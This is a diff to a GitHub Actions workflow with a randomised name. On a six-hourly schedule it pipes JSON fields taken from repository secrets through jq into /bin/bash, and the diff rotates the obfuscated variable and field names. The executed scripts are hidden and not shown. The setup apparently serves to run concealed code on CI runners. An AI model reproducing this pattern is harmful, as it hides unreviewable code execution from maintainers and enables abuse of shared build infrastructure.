@@ -1,8 +1,9 @@
 name: gaojiaoshi4389
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 4/6 * * *'
+    - cron: '3 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,22 +11,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: gaojiaoshi4389
         env:
-          ydsgx9972: ${{ secrets.ydsgx9972 }}
+          qyn45024: ${{ secrets.qyn45024 }}
         run: |
-          echo $ydsgx9972 | jq -r .ld899 | /bin/bash
-          echo $ezzwg1 | jq -r .ol26 | /bin/bash
-          echo $lm6 | jq -r .ojpby269 | /bin/bash
-          echo $xht7085 | jq -r .jkb10066 | /bin/bash
-          echo $hfoo18 | jq -r .o5 | /bin/bash
-          echo $o99115 | jq -r .ud9 | /bin/bash
-          echo $ksim9756 | jq -r .yqm46174 | /bin/bash
-          echo $eyp133 | jq -r .d9 | /bin/bash
-          echo $edzo89411 | jq -r .k6553 | /bin/bash
-          echo $jxfkm5834 | jq -r .kc16 | /bin/bash
-          echo $bglg8 | jq -r .zjdo48569 | /bin/bash
-          echo $i1868 | jq -r .orel09 | /bin/bash
-          echo $tqtik60 | jq -r .hpkp6 | /bin/bash
-          echo $nkerl9303 | jq -r .p38 | /bin/bash
-          echo $kctmy4269 | jq -r .ccgl9 | /bin/bash
-          echo $mf44372 | jq -r .knjfq73 | /bin/bash
+          echo $qyn45024 | jq -r .ml82325 | /bin/bash
+          echo $ptntt10 | jq -r .mfko28829 | /bin/bash
+          echo $qyb133 | jq -r .nx8 | /bin/bash
+          echo $j9959 | jq -r .utk2181 | /bin/bash
+          echo $rvkl0 | jq -r .ch0 | /bin/bash
+          echo $v8046 | jq -r .c7 | /bin/bash
+          echo $igsn6 | jq -r .y39 | /bin/bash
+          echo $vhw41657 | jq -r .t18018 | /bin/bash
+          echo $zrqfz8087 | jq -r .eshmi701 | /bin/bash
+          echo $yhs0658 | jq -r .iesez7 | /bin/bash
+          echo $je0 | jq -r .sj0449 | /bin/bash
+          echo $cccg334 | jq -r .fycs05114 | /bin/bash
+          echo $rkqpl36194 | jq -r .is77679 | /bin/bash
+          echo $ejzy79 | jq -r .sho2 | /bin/bash
+          echo $mhlp333 | jq -r .c4901 | /bin/bash
+          echo $o1885 | jq -r .xbob6 | /bin/bash
 
